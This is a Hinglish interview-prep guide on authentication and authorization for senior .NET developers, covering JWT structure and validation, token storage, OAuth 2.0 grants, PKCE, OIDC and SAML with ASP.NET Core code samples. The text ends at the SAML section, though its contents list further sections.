# Authentication & Authorization — Senior .NET Interview Guide

Audience: 10+ saal ka experience rakhne wala .NET full-stack developer jo senior/lead interviews ke liye prep kar raha hai. Fundamentals pehle se assume kiye gaye hain; focus nuance, trade-offs, "why", gotchas, aur follow-ups par hai.

## Table of Contents

- [1. Core Concepts](#1-core-concepts)
  - [1.1 Authentication vs Authorization](#11-authentication-vs-authorization)
  - [1.2 Stateful Sessions vs Stateless Tokens](#12-stateful-sessions-vs-stateless-tokens)
  - [1.3 Basic Authentication (Legacy)](#13-basic-authentication-legacy)
  - [1.4 What JWT Actually Is](#14-what-jwt-actually-is)
  - [1.5 JWT Anatomy — Header, Payload, Signature](#15-jwt-anatomy--header-payload-signature)
  - [1.6 Claims: Registered, Public, Private](#16-claims-registered-public-private)
- [2. Intermediate](#2-intermediate)
  - [2.1 Signing Algorithms: HS256 vs RS256 vs ES256](#21-signing-algorithms-hs256-vs-rs256-vs-es256)
  - [2.2 Where JWTs Live in HTTP & Storage Trade-offs](#22-where-jwts-live-in-http--storage-trade-offs)
  - [2.3 Access Tokens vs Refresh Tokens](#23-access-tokens-vs-refresh-tokens)
  - [2.4 Full Login → API → Refresh Flow](#24-full-login--api--refresh-flow)
  - [2.5 JWT Validation — What Actually Happens Internally](#25-jwt-validation--what-actually-happens-internally)
  - [2.6 Claims vs Roles vs Policy-Based Authorization](#26-claims-vs-roles-vs-policy-based-authorization)
  - [2.7 [new content] The 7 ASP.NET Core Authorization Styles](#27-new-content-the-7-aspnet-core-authorization-styles)
- [3. Advanced](#3-advanced)
  - [3.1 OAuth 2.0 — Roles, Flows, and Grant Types](#31-oauth-20--roles-flows-and-grant-types)
  - [3.2 [new content] OAuth2 Grant Types: Which Are Deprecated/Unsafe](#32-new-content-oauth2-grant-types-which-are-deprecatedunsafe)
  - [3.3 PKCE — Why It's Now Mandatory Even for Confidential Clients](#33-pkce--why-its-now-mandatory-even-for-confidential-clients)
  - [3.4 OAuth 2.0 vs OpenID Connect vs JWT](#34-oauth-20-vs-openid-connect-vs-jwt)
  - [3.5 [new content] SAML vs OIDC for SSO/Federation](#35-new-content-saml-vs-oidc-for-ssofederation)
  - [3.6 Azure AD (Entra ID) + Angular MSAL Implementation](#36-azure-ad-entra-id--angular-msal-implementation)
  - [3.7 Okta PKCE + Refresh Token + .NET API Implementation](#37-okta-pkce--refresh-token--net-api-implementation)
  - [3.8 [new content] Refresh Token Rotation & Reuse Detection](#38-new-content-refresh-token-rotation--reuse-detection)
  - [3.9 [new content] Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser](#39-new-content-securing-spa-to-api-auth-bff-pattern-vs-token-in-browser)
  - [3.10 [new content] ASP.NET Core Identity Customization](#310-new-content-aspnet-core-identity-customization)
  - [3.11 [new content] Multi-Tenant Authentication & Authorization](#311-new-content-multi-tenant-authentication--authorization)
  - [3.12 WebAuthn / FIDO2 / Passkeys [gaps]](#312-webauthn--fido2--passkeys-gaps)
  - [3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession) [gaps]](#313-dpop-rfc-9449--demonstrating-proof-of-possession-gaps)
- [4. Security & Performance](#4-security--performance)
  - [4.1 Why JWT Revocation Is Hard — and the Real Strategies](#41-why-jwt-revocation-is-hard--and-the-real-strategies)
  - [4.2 [new content] Opaque Tokens vs JWT for Revocation — the Real Trade-off](#42-new-content-opaque-tokens-vs-jwt-for-revocation--the-real-trade-off)
  - [4.3 [new content] JWT Validation Pitfalls: Algorithm Confusion & alg:none](#43-new-content-jwt-validation-pitfalls-algorithm-confusion--algnone)
  - [4.4 CSRF, XSS, and Session Fixation — How They Interact With Auth](#44-csrf-xss-and-session-fixation--how-they-interact-with-auth)
  - [4.5 [new content] mTLS for Service-to-Service Auth](#45-new-content-mtls-for-service-to-service-auth)
  - [4.6 [new content] API Keys vs OAuth Client Credentials for Machine-to-Machine](#46-new-content-api-keys-vs-oauth-client-credentials-for-machine-to-machine)
  - [4.7 Performance Considerations](#47-performance-considerations)
- [5. Best Practices](#5-best-practices)
- [6. Common Pitfalls](#6-common-pitfalls)
  - [6.1 JWT Pitfalls](#61-jwt-pitfalls)
  - [6.2 OAuth Pitfalls](#62-oauth-pitfalls)
  - [6.3 Refresh Token Pitfalls](#63-refresh-token-pitfalls)
- [7. Implementation Reference (C#)](#7-implementation-reference-c)
- [8. Sample Interview Q&A](#8-sample-interview-qa)
- [Summary of Additions](#summary-of-additions)
- [Summary of [gaps] Additions (This Pass)](#summary-of-gaps-additions-this-pass)

---

## 1. Core Concepts

### 1.1 Authentication vs Authorization

| | Authentication | Authorization |
|---|---|---|
| Answers | Tum ho kaun? | Tum kya kar sakte ho? |
| Mechanism | Login process (credentials, token, certificate) | Claims / roles / policies jo resource ke against evaluate hoti hain |
| ASP.NET Core middleware | `UseAuthentication()` `HttpContext.User` ko populate karta hai | `UseAuthorization()` `[Authorize]` requirements evaluate karta hai |
| Failure result | `401 Unauthorized` | `403 Forbidden` |
| Example | User login karta hai | User (jo already logged in hai) admin-only endpoint hit karne ki koshish karta hai |

**Interviewer follow-up:** *"Mera API 401 kyun return kar raha hai jab main 403 expect kar raha tha?"* — Usually iska matlab hota hai ki authentication handler ne kabhi valid principal populate hi nahi kiya (missing/invalid/expired token), isliye pipeline authorization evaluate karne tak pahuncha hi nahi. Agar aapko 403 milta hai, to authentication succeed ho gaya lekin policy/role check fail ho gaya.

### 1.2 Stateful Sessions vs Stateless Tokens

User ko requests ke across "remember" karne ke do broad approaches hain:

**A) Stateful sessions (classic)**
- User login karta hai; server ek session record store karta hai (memory/Redis/DB): `sessionId -> userId, roles, expiry`.
- Client sirf ek random `sessionId` cookie store karta hai; har request usse bhejti hai; server usko lookup karta hai.
- **Fayde:** revocation easy hai, server hi truth control karta hai.
- **Nuksan:** server ko session state store aur scale karna padta hai.

**B) Stateless tokens (JWT common format hai)**
- Server ek token issue karta hai jisme user ke baare mein claims hote hain; client har request mein isse bhejta hai; server cryptographically verify karta hai, koi session storage nahi.
- **Fayde:** horizontally scalable, koi central session store nahi.
- **Nuksan:** revocation harder hai; careful security design ki zarurat hoti hai.

```mermaid
flowchart LR
    subgraph Stateful["Stateful Session"]
    A1[Client] -- sessionId cookie --> A2[Server]
    A2 -- lookup --> A3[(Session Store\nRedis/DB)]
    end
    subgraph Stateless["Stateless JWT"]
    B1[Client] -- JWT --> B2[Server]
    B2 -- verify signature\nno DB call --> B2
    end
```

JWT stateless approach ke andar use hone wala ek common **format** hai — yeh uska synonym nahi hai.

### 1.3 Basic Authentication (Legacy)

`username:password` ko Base64-encoded karke **har** request par bhejta hai:

```
Authorization: Basic dXNlcjpwYXNzd29yZA==
```

- **Kaam kaise karta hai:** client `username:password` ko Base64 mein encode karta hai; server har call par decode karke validate karta hai.
- **Advantages:** implement karna trivial hai, universally supported hai, VPN ke peeche legacy/internal system-to-system calls ke liye theek hai.
- **Risks:** credentials har request par bheji jaati hain; Base64 *encoding* hai, encryption nahi — traffic intercept karne wale ko raw password mil jaata hai; koi expiry nahi, koi revocation nahi; agar TLS kabhi downgrade ho jaaye ya kisi untrusted jagah terminate ho jaaye to replay ke liye vulnerable hai.

**Yeh hamesha HTTPS par kyun chalna chahiye:** kyunki credentials sirf Base64-encoded hote hain, encrypted nahi — agar transport encrypted nahi hai, to credentials transit mein trivially recover kiye ja sakte hain (network path par kisi ke bhi, proxy logs, etc. dwara). Yeh insecure mana jaata hai kyunki credentials har request par bina expiration/revocation ke travel karte hain, aur ek captured request ko indefinitely replay kiya ja sakta hai. Legacy/internal systems ise sirf compatibility ke liye use karte hain jaha modern auth support nahi hota.

**Replay attack (definition):** ek attacker ek valid authenticated request ya token capture karta hai aur baad mein use resend karta hai unauthorized access paane ke liye, bina underlying credentials kabhi jaane. Basic Auth (aur bina freshness checks ke koi bhi bearer scheme) inherently iske liye susceptible hai jab tak TLS + short-lived credentials + sensitive operations ke liye nonces se mitigate na kiya jaaye.

### 1.4 What JWT Actually Is

JWT (JSON Web Token) ek compact, URL-safe string format hai jo JSON claims ka ek set represent karta hai. Yeh ho sakta hai:
- **Signed** (sabse common) → recipients authenticity + integrity verify karte hain. Yeh technically ek **JWS** (JSON Web Signature) hai.
- **Encrypted** (kam common) → content confidentiality. Yeh ek **JWE** (JSON Web Encryption) hai.

JWT broader **JOSE** family of specs ka part hai:

| Spec | Meaning |
|---|---|
| JWS | JSON Web Signature — signed JWT |
| JWE | JSON Web Encryption — encrypted JWT |
| JWK | JSON Web Key — key representation format |
| JWA | JSON Web Algorithms — algorithm names (`HS256`, `RS256`, etc.) |

Zyada tar log "JWT" kehte hain lekin unka matlab **JWS** hota hai (ek signed, non-encrypted token).

**Interview mein correct karne wali critical misconception:** *ek signed JWT secret nahi hota.* Jiske paas bhi yeh hai wo payload ko Base64URL-decode karke padh sakta hai. Signed JWT aapko deta hai:
- **Integrity** — payload ko signature invalidate kiye bina alter nahi kiya ja sakta.
- **Authenticity** — aap verify kar sakte ho ki isse kisne issue kiya (private/shared key ka holder).

Yeh confidentiality **nahi** deta. Agar aapko wo chahiye: JWE use karo, token mein sensitive data daalne se bilkul bacho, ya opaque tokens + introspection use karo.

Ek URL-safe token **Base64URL** encoding use karta hai (standard Base64 nahi): `+`→`-`, `/`→`_`, padding (`=`) aksar omit ho jaata hai. Yeh URLs mein special meaning wale characters se bachata hai, isliye JWTs ko extra escaping ke bina URLs/headers/cookies mein pass kiya ja sakta hai. Phir se — encoding security nahi hai.

### 1.5 JWT Anatomy — Header, Payload, Signature

Ek signed JWT: `xxxxx.yyyyy.zzzzz` — teen Base64URL-encoded segments jo dots se separated hote hain.

**Header (JSON):**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2026-05"
}
```
- `alg`: sign (ya encrypt) karne ke liye use hone wala algorithm.
- `typ`: usually `"JWT"` (aksar omit ho jaata hai).
- `kid`: key ID — verifier ko batata hai ki (JWKS set se) *kaun sa* public key use karna hai.

**Payload (claims):**
```json
{
  "iss": "https://auth.mycompany.com",
  "aud": "my-api",
  "sub": "user_123",
  "exp": 1760000000,
  "iat": 1759996400,
  "nbf": 1759996400,
  "scope": "orders:read orders:write",
  "role": "admin"
}
```

**Signature:** `base64url(header) + "." + base64url(payload)` ke upar `alg` mein named algorithm use karke compute ki jaati hai. Agar yeh verify ho jaaye, to aap jaante ho ki header+payload exactly wahi hai jo issuer ne sign kiya tha — na kuch zyada, na kam.

```mermaid
flowchart TB
    H["Header (JSON)\nalg, typ, kid"] --> B64H["Base64URL"]
    P["Payload (JSON claims)\niss, aud, sub, exp..."] --> B64P["Base64URL"]
    B64H --> CONCAT["base64url(header) + '.' + base64url(payload)"]
    B64P --> CONCAT
    CONCAT --> SIGN["Sign with alg + key"]
    SIGN --> JWT["Header.Payload.Signature"]
```

### 1.6 Claims: Registered, Public, Private

**Registered (standard) claims:**

| Claim | Meaning |
|---|---|
| `iss` | Issuer — kisne token issue kiya |
| `sub` | Subject — token kiske baare mein hai (aksar user id) |
| `aud` | Audience — intended recipient(s) (aapka API) |
| `exp` | Expiry — UNIX timestamp |
| `iat` | Issued at |
| `nbf` | Not-before — token is time se pehle valid nahi hai |
| `jti` | JWT ID — unique token id, revocation lists ke liye useful |

**Public claims:** globally unique/collision-resistant names (aksar URIs) jisse unrelated parties clash na karein.

**Private claims:** aapke apne application fields, jaise `"employeeId"`, `"tenantId"`, `"Department"`.

---

## 2. Intermediate

### 2.1 Signing Algorithms: HS256 vs RS256 vs ES256

Yeh ek bahut hi common deep-dive area hai.

**HS256 (HMAC-SHA256) — symmetric**
- Same secret sign *aur* verify karta hai.
- Koi bhi service jo token verify kar sakti hai, uske paas secret hona zaroori hai — agar wo leak ho jaaye, to us party (ya jisne bhi steal kiya) valid tokens *mint* kar sakta hai, sirf padh nahi sakta.
- Achha hai jab: single authority, tightly controlled services ka set ho.
- Risky hai jab: kaafi services/clients ko tokens verify karne ki zarurat ho (secret sprawl).

**RS256 (RSA) — asymmetric**
- Private key sign karti hai; public key verify karti hai.
- APIs ko sirf public key ki zarurat hoti hai — safer distribution, koi shared secret nahi.
- Achha hai jab: microservices, third-party verification, ek JWKS endpoint publish karna ho.

**ES256 (ECDSA) — asymmetric**
- RS256 jaisa hi asymmetric split, lekin smaller keys/tokens aur aksar faster verification.
- Kuch ecosystems mein thoda zyada operational friction (library/HSM support).

**Rule of thumb:** RS256/ES256 access tokens ke liye use karo jab bhi ek se zyada service unhe verify karti hai. HS256 sirf tab use karo jab aap har verifier ko fully control karte ho aur shared secret ko protect kar sakte ho.

| | HS256 | RS256 | ES256 |
|---|---|---|---|
| Key type | Symmetric | Asymmetric | Asymmetric |
| Kaun verify kar sakta hai | Jiske paas secret hai (forge bhi kar sakta hai) | Jiske paas public key hai (forge nahi kar sakta) | Jiske paas public key hai (forge nahi kar sakta) |
| Best for | Single-service/monolith | Multi-service/microservices | Multi-service, size/perf sensitive |
| Key distribution risk | High (secret har verifier tak pahunchna chahiye) | Low (sirf public key) | Low (sirf public key) |

### 2.2 Where JWTs Live in HTTP & Storage Trade-offs

Sabse common: `Authorization: Bearer <token>`. Alternative: cookie-based (HttpOnly Secure cookie), especially browser apps ke liye.

**Browser storage options:**

| Storage | JS se readable? | XSS risk | CSRF risk | Notes |
|---|---|---|---|---|
| `localStorage` | Haan | High — koi bhi injected script isse padh sakta hai | Nahi (auto-sent nahi hota) | Implement karna sabse easy, security posture sabse worst |
| `sessionStorage` | Haan | High — upar jaisa hi | Nahi | Tab close hone par clear ho jaata hai; abhi bhi XSS-vulnerable |
| HttpOnly cookie | Nahi | Low — JS ise padh nahi sakti | Haan — CSRF protection add karni padegi | Browser-facing apps ke liye best default |

Koi universally "perfect" answer nahi hai — yeh app type aur threat model par depend karta hai. SPA + API ke liye, kaafi teams HttpOnly cookies + CSRF protection prefer karti hain, ya ek BFF pattern (dekho [3.9](#39-new-content-securing-spa-to-api-auth-bff-pattern-vs-token-in-browser)) jo tokens ko browser se bilkul door rakhta hai.

### 2.3 Access Tokens vs Refresh Tokens

| Aspect | Access Token | Refresh Token |
|---|---|---|
| Purpose | APIs access karna | Naya access token obtain karna |
| Lifetime | Short (5–30 min) | Long (days/weeks) |
| Stored | Client memory / short-lived cookie | Secure storage (HttpOnly cookie, encrypted DB row) |
| API ko sent | Haan, har request | Nahi — sirf token/auth endpoint ko |
| Revocable | Hard (stateless) | Easy (server-side record) |
| Steal hone par risk | Limited (short window) | High (long window) jab tak rotation + reuse detection na ho |
| Typical format | JWT | Usually **opaque** random string, JWT nahi |

**One-liner:** Access token short-lived hota hai aur APIs call karne ke liye use hota hai; refresh token long-lived hota hai aur bina forced re-login naye access tokens obtain karne ke liye use hota hai.

**Refresh tokens usually opaque kyun hote hain, JWT nahi:** aapko easy server-side revocation aur rotation tracking chahiye — ek opaque token sirf ek lookup key hai ek DB/Redis record mein jo aap fully control karte ho, jisme koi self-contained claims stale hone ke liye nahi hote.

### 2.4 Full Login → API → Refresh Flow

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant API as Resource API

    C->>AS: POST /login (credentials)
    AS->>AS: Validate credentials
    AS-->>C: Access Token (JWT) + Refresh Token (opaque)
    C->>API: GET /orders (Authorization: Bearer <access token>)
    API->>API: Validate signature, iss, aud, exp
    API-->>C: 200 OK (data)
    Note over C,API: ...time passes, access token expires...
    C->>AS: POST /refresh (refresh token)
    AS->>AS: Validate refresh token, rotate it
    AS-->>C: New Access Token + New Refresh Token (old one invalidated)
```

Rotation ka matlab hai: har refresh par ek brand-new refresh token generate hota hai, aur purana wala invalid ho jaata hai — yeh theft *detect* karne mein madad karta hai (dekho [3.8](#38-new-content-refresh-token-rotation--reuse-detection)).

### 2.5 JWT Validation — What Actually Happens Internally

Ek correct verifier "signature aur expiry check karo" se **kaafi zyada** karta hai. Yeh ek highest-value interview answer hai jo aap de sakte ho, kyunki zyada tar candidates "signature aur expiry verify karo" par ruk jaate hain.

1. **Parse** header + payload — abhi kisi bhi field par trust mat karo.
2. **Key ko safely select karo:**
   - RS256/ES256 ke liye, `kid` se public key ek **trusted, pre-configured** JWKS endpoint se pick karo.
   - **Kabhi bhi** token khud jis URL par point karta hai usse keys fetch mat karo (classic `jku`/`x5u` header injection attack).
3. **Signature verify karo** us algorithm se jo *aapne* server-side configure kiya hai — kabhi bhi wo algorithm nahi jo token claim karta hai (dekho [4.3](#43-new-content-jwt-validation-pitfalls-algorithm-confusion--algnone)).
4. **Standard claims validate karo:**
   - `exp` future mein ho (thoda clock skew allow karo, e.g. 1–2 minutes).
   - `nbf` ≤ now.
   - `iss` expected issuer ke equal ho.
   - `aud` mein aapke API ka audience identifier include ho.
5. **Authorize:** requested resource ke against scopes/roles/permissions claims check karo.
6. **Optional lekin common hardening:**
   - `jti` ko ek revocation list ke against check karo.
   - `tenantId` claim request ke tenant context se match karta hai ya nahi check karo (multi-tenant apps).
   - `typ`/`token_use` claim check karo taaki refresh token ko access token ke roop mein replay na kiya ja sake.

**Interview mein zor se kehne wala key idea:** *signature yeh prove karta hai ki issuer ne yeh token banaya; claims validation yeh prove karta hai ki yeh mere liye hai aur abhi bhi valid hai.* Dono zaroori hain — ek candidate jo sirf signature mention karta hai, wo incomplete answer de raha hai.

Ek baar validate hone ke baad, claims `HttpContext.User` (ek `ClaimsPrincipal`) mein materialize ho jaate hain jinhe authorization stage consume karta hai.

### 2.6 Claims vs Roles vs Policy-Based Authorization

**Role:** simple grouping — `Admin`, `User`, `Manager`.
**Claim:** key-value pair — `Department=Finance`, `Country=IN`.
**Policy:** ek named, centrally-registered rule jo claims, roles, aur/ya custom logic se banaya jaata hai.

| Feature | Role-based | Claims-based | Policy-based |
|---|---|---|---|
| Flexibility | Low | High | Highest |
| Granularity | Coarse | Fine-grained | Fine-grained + composable |
| Scalability | Limited (role explosion: `AdminForRegionX`, `AdminForRegionY`...) | Highly scalable | Highly scalable, centralized |
| Logic kahan rehta hai | Scattered `[Authorize(Roles=...)]` attributes | Scattered `[Authorize]` + manual claim checks | Centralized in `AddAuthorization()` — one source of truth |
| Real-world usage | Small apps, simple hierarchies | Attribute-based access chahiye wali enterprise apps | Enterprise apps, especially dynamic/custom rules ke saath |

```csharp
// Role-based
[Authorize(Roles = "Admin")]

// Claims-based (ad hoc, inline)
if (!User.HasClaim("Department", "IT")) return Forbid();

// Policy-based (centralized, reusable, testable)
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ITOnly", policy => policy.RequireClaim("Department", "IT"));
});

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

**Claims/policies roles se better scale kyun karte hain:** roles coarse hote hain aur requirements specific hone ke saath combinatorially multiply hote hain (`RegionAdmin`, `FinanceRegionAdmin`...). Claims aapko attributes independently express karne dete hain aur unhe policies mein combine karne dete hain, bina role table explode kiye. Policies additionally decision logic ko centralize karti hain taaki wo controllers ke across duplicate na ho — ek senior-level system mein auditability ke liye critical.

**Policy pitfalls:** nested requirements wali overly complex policies unit test aur debug karna hard ho jaata hai (ek failed policy default se sirf 403 return karta hai bahut kam diagnostic detail ke saath) — custom `IAuthorizationHandler`s se mitigate karo jo log karte hain ki *kyun* requirement fail hui, aur policies ko small aur composable rakho, monolithic nahi.

### 2.7 [new content] The 7 ASP.NET Core Authorization Styles

Aapke notes mein yeh sirf ek bare enumeration ke roop mein listed the, bina kisi explanation ke. Yahan complete picture hai, kyunki interviewers aksar poochte hain "ASP.NET Core kaun se authorization models support karta hai aur kab kaun sa use karna chahiye":

1. **Simple authorization** — `[Authorize]` bina kisi parameter ke; sirf ek authenticated user chahiye.
2. **Role-based authorization** — `[Authorize(Roles = "Admin,Manager")]`; `ClaimTypes.Role` claims check karta hai.
3. **Policy-based authorization** — named policies ek baar register hoti hain, `[Authorize(Policy = "...")]` ke through reference ki jaati hain; trivial checks se aage kuch bhi ke liye recommended default.
4. **Claims-based authorization** — policy ke andar `RequireClaim(...)`, ya manual `User.HasClaim(...)` checks; roles se finer-grained.
5. **Custom requirement-based authorization** — `IAuthorizationRequirement` + `AuthorizationHandler<T>` implement karo un logic ke liye jo declaratively express nahi ho sakte (e.g. "user sirf apne banaye orders edit kar sakta hai", "user ka clearance level ≥ document ki classification"). Yahin **resource-based** checks usually rehte hain.
6. **Endpoint-specific authorization** — Minimal APIs mein, `.RequireAuthorization("PolicyName")` route registration par chain kiya jaata hai attribute ki jagah — same underlying policy engine, sirf minimal API / endpoint routing style ke liye different syntax surface.
7. **Resource-based authorization** — `IAuthorizationService.AuthorizeAsync(User, resource, policy)` jaha decision *specific object* jo access ho raha hai us par depend karta hai, sirf user ke claims par nahi (e.g., "kya yeh user *is* document ko delete kar sakta hai" ke liye pehle document load karke ownership check karna zaroori hai). Yeh wo mechanism hai jo aap use karte ho jab policy-based checks kaafi nahi hote kyunki rule runtime data par depend karta hai, sirf token par nahi.

```csharp
// Resource-based authorization example
public class DocumentAuthHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context, SameAuthorRequirement requirement, Document resource)
    {
        if (resource.OwnerId == context.User.FindFirstValue(ClaimTypes.NameIdentifier))
            context.Succeed(requirement);
        return Task.CompletedTask;
    }
}

// Usage in a controller
var result = await _authorizationService.AuthorizeAsync(User, document, "SameAuthorPolicy");
if (!result.Succeeded) return Forbid();
```

---

## 3. Advanced

### 3.1 OAuth 2.0 — Roles, Flows, and Grant Types

OAuth 2.0 ek **authorization framework** hai — yeh user ko apna data ek third-party application ko access dene deta hai *bina credentials share kiye*. Yeh khud ek authentication protocol nahi hai (wo OIDC upar layer karta hai — dekho [3.4](#34-oauth-20-vs-openid-connect-vs-jwt)).

**Four roles:**
- **Resource Owner** — wo user jiska data hai.
- **Client** — wo application jo access request kar rahi hai.
- **Authorization Server** — resource owner ko authenticate karta hai aur tokens issue karta hai.
- **Resource Server** — wo API jo protected resources host karta hai.

**Authorization Code flow (canonical example, e.g. "Login with Google"):**

1. User "Login with Google" click karta hai.
2. App Google ke authorization endpoint par redirect karta hai.
3. User authenticate karta hai aur permission grant karta hai.
4. Google ek **authorization code** ke saath back redirect karta hai.
5. App code ko tokens ke liye exchange karta hai (server-to-server call, confidential clients ke liye client secret include karta hai, ya public clients ke liye PKCE verifier).
6. App **access token** use karke API call karta hai; API isse validate karke data return karta hai.

```
GET https://accounts.google.com/o/oauth2/auth
    ?client_id=YOUR_CLIENT_ID
    &redirect_uri=https://yourapp.com/callback
    &response_type=code
    &scope=email profile
```

```
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

client_id=YOUR_CLIENT_ID
&client_secret=YOUR_CLIENT_SECRET
&code=AUTHORIZATION_CODE
&grant_type=authorization_code
&redirect_uri=https://yourapp.com/callback
```

```json
{
  "access_token": "ya29.a0AR...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "refresh_token": "1//0g..."
}
```

### 3.2 [new content] OAuth2 Grant Types: Which Are Deprecated/Unsafe

Aapke notes mein sirf Authorization Code aur Client Credentials ka passing mention tha. Senior interviews frequently poore grant-type landscape ko probe karte hain aur ki kaun se 2026 mein kabhi use nahi karne chahiye:

| Grant type | Status | Use case | Why / why not |
|---|---|---|---|
| Authorization Code (+ PKCE) | **Current standard** | Web apps, SPAs, mobile apps — koi bhi app jaha user present ho | Code URL/browser history mein tokens expose nahi karta; PKCE code exchange ko protect karta hai public clients ke liye bhi |
| Client Credentials | **Current standard** | Machine-to-machine, koi user present nahi (service dusri service ko call kar rahi hai) | Client apne khud ke secret/certificate se authenticate karta hai; koi user context bilkul nahi |
| Refresh Token | **Current standard** | Silently naya access token obtain karna | Hamesha rotate hona chahiye; dekho [3.8](#38-new-content-refresh-token-rotation--reuse-detection) |
| Device Code | **Current standard** | Input-constrained devices (smart TVs, CLIs) | User doosri device par ek short code se authenticate karta hai |
| **Implicit** | **Deprecated — use mat karo** | Tha: SPAs PKCE aane se pehle | Access token seedhe URL fragment mein return karta hai — koi code exchange nahi, koi client authentication nahi, token browser history/referrer headers mein expose hota hai, refresh token support nahi. OAuth 2.1 ise poori tarah remove kar deta hai. |
| **Resource Owner Password Credentials (ROPC)** | **Deprecated/discouraged** | Tha: trusted first-party apps jinhe seedhe username/password collect karne hote the | OAuth ka poora purpose defeat kar deta hai (app raw credentials handle karta hai); MFA/federated login support nahi; OAuth 2.1 ise remove kar deta hai. Sirf legacy migration scenarios mein marginally acceptable hai ek fully trusted first-party client ke saath, aur tab bhi possible ho to avoid karo. |

**Interviewer ka follow-up:** *"Agar implicit flow dead hai, to modern SPAs tokens kaise paate hain?"* — Authorization Code + PKCE, confidential clients jaisa hi, kyunki PKCE client secret ki zarurat hata deta hai jabki secure code-exchange model use karta rehta hai (dekho next section).

### 3.3 PKCE — Why It's Now Mandatory Even for Confidential Clients

**PKCE (Proof Key for Code Exchange, RFC 7636)** originally **public clients** (SPAs, mobile apps) ko protect karne ke liye design kiya gaya tha, jo safely ek client secret hold nahi kar sakte, authorization code ko us client se bind karke jisne use request kiya:

1. Client ek random `code_verifier` generate karta hai aur `code_challenge = BASE64URL(SHA256(code_verifier))` derive karta hai.
2. Authorization request mein `code_challenge` + `code_challenge_method=S256` include hota hai.
3. Authorization server issued code ke saath challenge store karta hai.
4. Token exchange request mein original `code_verifier` include hota hai.
5. Server hash recompute karke compare karta hai — agar match nahi hota, exchange reject ho jaata hai.

Yeh **authorization code interception attacks** ko defeat karta hai: agar attacker code intercept bhi kar le (e.g., mobile par same custom URI scheme register karne wale malicious app se, ya compromised network se), wo verifier ke bina use exchange nahi kar sakta, jo original client se kabhi bahar nahi jaata.

**Why OAuth 2.1 / current best practice (e.g. Azure AD, Okta) ab confidential clients ke liye bhi PKCE recommend karta hai** — sirf public clients ke liye nahi:
- Defense in depth: even ek confidential client ka authorization code redirect step par intercept ho sakta hai (browser history, referrer leakage, logs); PKCE client type se independent us gap ko close karta hai.
- Guidance simplify karta hai: "hamesha PKCE use karo" ek simpler, zyada auditable rule hai "sirf public clients ke liye PKCE use karo" ke muqable — kam configuration decisions ka matlab hai kam misconfigurations.
- Yeh cheap hai: ise add karne ka koi operational cost nahi hai, aur yeh confidential clients ke liye client secret/certificate auth ke saath cleanly compose ho jaata hai (dono checks apply hote hain).

```mermaid
sequenceDiagram
    participant App as SPA (public client)
    participant AS as Authorization Server
    participant API as Resource API

    App->>App: Generate code_verifier, derive code_challenge (S256)
    App->>AS: Authorization request + code_challenge
    AS->>App: Redirect with authorization code
    App->>AS: Token request: code + code_verifier
    AS->>AS: Recompute SHA256(code_verifier), compare to stored challenge
    AS-->>App: Access Token + ID Token (+ Refresh Token if offline_access)
    App->>API: Bearer <access_token>
    API-->>App: Protected data
```

### 3.4 OAuth 2.0 vs OpenID Connect vs JWT

Yeh teen aksar conflate ho jaate hain — ek senior candidate ko unhe cleanly separate karne ka pata hona chahiye:

- **JWT** = ek **token format** hai (claims kaise package aur sign kiye jaate hain).
- **OAuth 2.0** = ek **authorization framework** hai (client tokens kaise paata hai aur use karta hai kisi resource ko user ki taraf se access karne ke liye).
- **OpenID Connect (OIDC)** = OAuth 2.0 ke upar banaya gaya ek **identity layer** hai — ek standardized **ID Token** (hamesha ek JWT), ek `/userinfo` endpoint, aur standardized login semantics add karta hai.

| | OAuth 2.0 | JWT |
|---|---|---|
| Purpose | Authorization protocol | Token format |
| Usage | Access delegate karna (e.g. Google login flow) | Claims authenticate/represent karna |
| User data contain karta hai? | Nahi, khud se (opaque ya JWT access tokens use karta hai) | Haan — self-contained |
| Validate karne ke liye call chahiye? | Depends — opaque tokens ke liye introspection | Nahi — cryptographic local validation |
| Best for | Third-party/delegated access, SSO | Stateless authentication payload |

Ek OIDC flow mein aapko typically teen tokens milte hain:

| Token | Purpose | Typical format |
|---|---|---|
| **ID Token** | *Client app* ko batata hai ki user kaun hai | Hamesha JWT |
| **Access Token** | *Resource API* ko calls authorize karta hai | JWT ya opaque |
| **Refresh Token** | Bina re-login naye tokens obtain karta hai | Usually opaque |

**Yahan sabse common mistake, interview mein proactively state karne layak:** aapke API ko call karne ke liye **ID token** use karna. ID tokens *client* ke liye hain taaki wo locally identity establish kar sake — yeh resource servers ke liye nahi hain jab tak system explicitly waise design na ho (aur tab bhi, yeh unusual hai). APIs ko **access tokens** validate karne chahiye, jinka `aud` claim us API ke liye scoped hota hai.

### 3.5 [new content] SAML vs OIDC for SSO/Federation

Original notes mein bilkul cover nahi kiya gaya, lekin enterprise/senior interviews mein near-guaranteed topic hai kyunki kaafi .NET shops abhi bhi SAML ko OIDC ke saath chalate hain (e.g., legacy enterprise SSO with ADFS, ya partner IdPs ke saath B2B federation).

| | SAML 2.0 | OpenID Connect |
|---|---|---|
| Token format | XML (signed assertions) | JWT (JSON) |
| Transport | Browser redirects/POST bindings, heavier XML payloads | Compact URL-safe tokens ke saath redirects |
| Primary era/use case | Enterprise SSO, legacy IdPs (ADFS, Okta/Azure AD as SAML IdP), B2B federation | Modern web/mobile/SPA, API-first architectures |
| Mobile/SPA friendliness | Poor — XML parsing, larger payloads, native apps ke liye design nahi hua | Good — mobile/SPA ko dhyan mein rakh kar design hua (PKCE, etc.) |
| Logout | SAML Single Logout (SLO) — providers ke across notoriously fragile | OIDC RP-Initiated Logout — simpler lekin abhi bhi cross-browser/session edge cases hain |
| Developer ergonomics | Verbose, XML-signature edge cases (historically canonicalization attacks) | JSON, well-supported libraries, JWKS-based key rotation |
| Kab abhi bhi dikhta hai | Legacy enterprise apps, kuch B2B partner integrations jo sirf SAML bolte hain | Har naye project mein |

